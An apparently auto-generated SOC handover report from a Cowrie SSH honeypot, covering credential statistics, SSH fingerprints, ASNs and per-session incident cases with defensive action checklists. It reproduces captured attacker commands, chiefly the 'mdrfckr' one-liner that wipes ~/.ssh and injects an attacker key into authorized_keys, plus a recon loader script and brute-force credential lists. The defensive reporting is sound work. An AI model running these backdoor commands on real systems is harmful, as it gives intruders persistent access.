# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-10 |
| **Generated At** | 2026-10-10T16:35:47Z |
| **Shift Time** | 16:35 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **307** |
| Confirmed Threats | **278** |
| False Positives Filtered | **29** (9.4%) |
| Unique Attacker IPs | **188** |
| Countries of Origin | **42** |
| High Severity Cases | **160** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **147** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **2526** |
| Unique Credential Pairs | **2264** |
| Unique Usernames | **1425** |
| Unique Passwords | **1148** |
| Successful Auth Pairs | **2414** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 204 |
| `345gs5662d34` | 100 |
| `admin` | 53 |
| `support` | 23 |
| `administrator` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 100 |
| `3245gs5662d34` | 97 |
| `support` | 21 |
| `123456` | 20 |
| `admin` | 17 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 100 |
| `root` | `3245gs5662d34` | 37 |
| `support` | `support` | 20 |
| `admin` | `admin` | 10 |
| `root` | `1234` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `azsxdcfv` | `10.0.0.73` | 2026-10-10T03:04:08 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-10-10T03:04:10 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-10-10T03:04:10 |
| `root` | `1` | `92.118.39.14` | 2026-10-10T03:05:16 |
| `syncthing` | `syncthing` | `10.0.0.73` | 2026-10-10T03:05:35 |
| `syncthing` | `3245gs5662d34` | `10.0.0.73` | 2026-10-10T03:05:40 |
| `admin` | `P@55w0rd` | `10.0.0.73` | 2026-10-10T03:07:02 |
| `admin` | `3245gs5662d34` | `10.0.0.73` | 2026-10-10T03:07:06 |
| `info1` | `123456` | `10.0.0.73` | 2026-10-10T03:07:17 |
| `info1` | `3245gs5662d34` | `10.0.0.73` | 2026-10-10T03:07:21 |
| `root` | `qq123456..` | `10.0.0.73` | 2026-10-10T03:07:31 |
| `root` | `12` | `92.118.39.14` | 2026-10-10T03:08:00 |
| `gc` | `12345` | `10.0.0.73` | 2026-10-10T03:10:19 |
| `gc` | `3245gs5662d34` | `10.0.0.73` | 2026-10-10T03:10:25 |
| `david` | `david` | `10.0.0.73` | 2026-10-10T03:10:31 |
| `david` | `3245gs5662d34` | `10.0.0.73` | 2026-10-10T03:10:35 |
| `root` | `123` | `92.118.39.14` | 2026-10-10T03:10:37 |
| `hilda` | `hilda` | `10.0.0.73` | 2026-10-10T03:11:05 |
| `hilda` | `3245gs5662d34` | `10.0.0.73` | 2026-10-10T03:11:08 |
| `root` | `1234` | `92.118.39.14` | 2026-10-10T03:13:11 |
_… 2394 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **307** |
| Sessions with Fingerprint | **24** |
| Unique HASSH Fingerprints | **24** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 149 |
| Go SSH scanner | 40 |
| Paramiko (Python) | 4 |
| Unknown | 3 |
| PuTTY | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 120 | 62 |
| `2ec37a7cc8da...` | Mirai/variant | 11 | 3 |
| `03a80b21afa8...` | Modern SSH client | 8 | 5 |
| `eff4c24daffc...` | Modern SSH client | 6 | 1 |
| `0a07365cc01f...` | Generic scanner | 6 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 120 | 62 | Mirai/variant |
| `95420f9d932d...` | libssh | 13 | 7 | — |
| `2ec37a7cc8da...` | Go SSH scanner | 11 | 3 | Mirai/variant |
| `03a80b21afa8...` | libssh | 8 | 5 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 6 | 1 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 6 | 4 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 4 | 4 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 3 | 3 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **11** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 161 | 3 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 57 | 57 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`, `80.94.92.179`, `92.118.39.49`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
Source IPs: `106.13.107.35`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `168.167.228.85`, `128.14.225.164`, `156.239.236.204`, `103.144.3.181`, `45.78.204.246`, `220.247.224.226`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **188** |
| Unique ASNs | **87** |
| High-Risk ASNs | **72** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 44 | HIGH |
| `AS4766` | Korea Telecom | 10 | HIGH |
| `AS396982` | Google LLC | 9 | HIGH |
| `AS8075` | Microsoft Corporation | 8 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 5 | HIGH |
| `AS12389` | PJSC Rostelecom | 5 | LOW |
| `AS6939` | Hurricane Electric LLC | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (158)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-52ba230e4d5c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-10-10 03:05 |
| **Last Seen** | 2026-10-10 03:05 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 03:05:12` | `cowrie.session.connect` |
| `2026-10-10 03:05:13` | `cowrie.client.version` |
| `2026-10-10 03:05:13` | `cowrie.client.kex` |
| `2026-10-10 03:05:16` | `cowrie.login.success` |
| `2026-10-10 03:05:19` | `cowrie.session.params` |
| `2026-10-10 03:05:19` | `cowrie.command.input` |
| `2026-10-10 03:05:19` | `cowrie.command.input` |
| `2026-10-10 03:05:19` | `cowrie.command.input` |
| `2026-10-10 03:05:19` | `cowrie.command.input` |
| `2026-10-10 03:05:19` | `cowrie.command.input` |
| `2026-10-10 03:05:19` | `cowrie.command.success` |
| `2026-10-10 03:05:19` | `cowrie.command.input` |
| `2026-10-10 03:05:19` | `cowrie.command.input` |
| `2026-10-10 03:05:19` | `cowrie.command.input` |
| `2026-10-10 03:05:19` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f728ffb84842

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-10 03:15 |
| **Last Seen** | 2026-10-10 03:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 03:15:55` | `cowrie.session.connect` |
| `2026-10-10 03:15:55` | `cowrie.client.version` |
| `2026-10-10 03:15:55` | `cowrie.client.kex` |
| `2026-10-10 03:15:55` | `cowrie.login.success` |
| `2026-10-10 03:15:56` | `cowrie.direct-tcpip.request` |
| `2026-10-10 03:15:56` | `cowrie.direct-tcpip.data` |
| `2026-10-10 03:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34d4affb0ead

| Field | Detail |
|---|---|
| **Source IP** | `20.96.179[.]87` |
| **First Seen** | 2026-10-10 03:31 |
| **Last Seen** | 2026-10-10 03:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 03:31:51` | `cowrie.session.connect` |
| `2026-10-10 03:31:51` | `cowrie.client.version` |
| `2026-10-10 03:31:51` | `cowrie.client.kex` |
| `2026-10-10 03:31:51` | `cowrie.login.success` |
| `2026-10-10 03:31:51` | `cowrie.session.params` |
| `2026-10-10 03:31:51` | `cowrie.command.input` |
| `2026-10-10 03:31:51` | `cowrie.command.failed` |
| `2026-10-10 03:31:52` | `cowrie.log.closed` |
| `2026-10-10 03:31:52` | `cowrie.session.params` |
| `2026-10-10 03:31:52` | `cowrie.command.input` |
| `2026-10-10 03:31:52` | `cowrie.session.file_download` |
| `2026-10-10 03:31:52` | `cowrie.log.closed` |
| `2026-10-10 03:31:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.96.179[.]87` to AbuseIPDB if not already reported
- [ ] Block `20.96.179[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e2a11936455

| Field | Detail |
|---|---|
| **Source IP** | `20.96.179[.]87` |
| **First Seen** | 2026-10-10 03:31 |
| **Last Seen** | 2026-10-10 03:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 03:31:52` | `cowrie.session.connect` |
| `2026-10-10 03:31:52` | `cowrie.client.version` |
| `2026-10-10 03:31:52` | `cowrie.client.kex` |
| `2026-10-10 03:31:52` | `cowrie.login.success` |
| `2026-10-10 03:31:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.96.179[.]87` to AbuseIPDB if not already reported
- [ ] Block `20.96.179[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a73a92adf9c9

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]127` |
| **First Seen** | 2026-10-10 03:39 |
| **Last Seen** | 2026-10-10 03:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 03:39:21` | `cowrie.session.connect` |
| `2026-10-10 03:39:21` | `cowrie.client.version` |
| `2026-10-10 03:39:21` | `cowrie.client.kex` |
| `2026-10-10 03:39:22` | `cowrie.login.success` |
| `2026-10-10 03:39:23` | `cowrie.session.params` |
| `2026-10-10 03:39:23` | `cowrie.command.input` |
| `2026-10-10 03:39:23` | `cowrie.log.closed` |
| `2026-10-10 03:39:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]127` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c3424515de0

| Field | Detail |
|---|---|
| **Source IP** | `34.14.122[.]221` |
| **First Seen** | 2026-10-10 03:56 |
| **Last Seen** | 2026-10-10 03:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 03:56:42` | `cowrie.session.connect` |
| `2026-10-10 03:56:42` | `cowrie.client.version` |
| `2026-10-10 03:56:42` | `cowrie.client.kex` |
| `2026-10-10 03:56:42` | `cowrie.login.success` |
| `2026-10-10 03:56:43` | `cowrie.session.params` |
| `2026-10-10 03:56:43` | `cowrie.command.input` |
| `2026-10-10 03:56:43` | `cowrie.command.failed` |
| `2026-10-10 03:56:43` | `cowrie.log.closed` |
| `2026-10-10 03:56:43` | `cowrie.session.params` |
| `2026-10-10 03:56:43` | `cowrie.command.input` |
| `2026-10-10 03:56:44` | `cowrie.session.file_download` |
| `2026-10-10 03:56:44` | `cowrie.log.closed` |
| `2026-10-10 03:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.122[.]221` to AbuseIPDB if not already reported
- [ ] Block `34.14.122[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-694e38a40de3

| Field | Detail |
|---|---|
| **Source IP** | `34.14.122[.]221` |
| **First Seen** | 2026-10-10 03:56 |
| **Last Seen** | 2026-10-10 03:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 03:56:44` | `cowrie.session.connect` |
| `2026-10-10 03:56:44` | `cowrie.client.version` |
| `2026-10-10 03:56:44` | `cowrie.client.kex` |
| `2026-10-10 03:56:44` | `cowrie.login.success` |
| `2026-10-10 03:56:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.122[.]221` to AbuseIPDB if not already reported
- [ ] Block `34.14.122[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-525a9f44d4dc

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]154` |
| **First Seen** | 2026-10-10 03:57 |
| **Last Seen** | 2026-10-10 03:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 03:57:30` | `cowrie.session.connect` |
| `2026-10-10 03:57:30` | `cowrie.client.version` |
| `2026-10-10 03:57:30` | `cowrie.client.kex` |
| `2026-10-10 03:57:31` | `cowrie.login.success` |
| `2026-10-10 03:57:32` | `cowrie.session.params` |
| `2026-10-10 03:57:32` | `cowrie.command.input` |
| `2026-10-10 03:57:32` | `cowrie.command.failed` |
| `2026-10-10 03:57:33` | `cowrie.log.closed` |
| `2026-10-10 03:57:34` | `cowrie.session.params` |
| `2026-10-10 03:57:34` | `cowrie.command.input` |
| `2026-10-10 03:57:34` | `cowrie.session.file_download` |
| `2026-10-10 03:57:34` | `cowrie.log.closed` |
| `2026-10-10 03:57:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]154` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-462a37e3c22b

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]154` |
| **First Seen** | 2026-10-10 03:57 |
| **Last Seen** | 2026-10-10 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 03:57:34` | `cowrie.session.connect` |
| `2026-10-10 03:57:34` | `cowrie.client.version` |
| `2026-10-10 03:57:34` | `cowrie.client.kex` |
| `2026-10-10 03:57:35` | `cowrie.login.success` |
| `2026-10-10 03:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]154` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53ff04862161

| Field | Detail |
|---|---|
| **Source IP** | `203.189.221[.]17` |
| **First Seen** | 2026-10-10 03:58 |
| **Last Seen** | 2026-10-10 03:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 03:58:21` | `cowrie.session.connect` |
| `2026-10-10 03:58:21` | `cowrie.client.version` |
| `2026-10-10 03:58:21` | `cowrie.client.kex` |
| `2026-10-10 03:58:22` | `cowrie.login.success` |
| `2026-10-10 03:58:24` | `cowrie.session.params` |
| `2026-10-10 03:58:24` | `cowrie.command.input` |
| `2026-10-10 03:58:24` | `cowrie.command.failed` |
| `2026-10-10 03:58:25` | `cowrie.log.closed` |
| `2026-10-10 03:58:25` | `cowrie.session.params` |
| `2026-10-10 03:58:25` | `cowrie.command.input` |
| `2026-10-10 03:58:26` | `cowrie.session.file_download` |
| `2026-10-10 03:58:26` | `cowrie.log.closed` |
| `2026-10-10 03:58:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.189.221[.]17` to AbuseIPDB if not already reported
- [ ] Block `203.189.221[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c113343be5c

| Field | Detail |
|---|---|
| **Source IP** | `203.189.221[.]17` |
| **First Seen** | 2026-10-10 03:58 |
| **Last Seen** | 2026-10-10 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 03:58:26` | `cowrie.session.connect` |
| `2026-10-10 03:58:26` | `cowrie.client.version` |
| `2026-10-10 03:58:27` | `cowrie.client.kex` |
| `2026-10-10 03:58:28` | `cowrie.login.success` |
| `2026-10-10 03:58:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.189.221[.]17` to AbuseIPDB if not already reported
- [ ] Block `203.189.221[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db6daa7a2786

| Field | Detail |
|---|---|
| **Source IP** | `103.98.176[.]164` |
| **First Seen** | 2026-10-10 03:58 |
| **Last Seen** | 2026-10-10 03:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 03:58:57` | `cowrie.session.connect` |
| `2026-10-10 03:58:57` | `cowrie.client.version` |
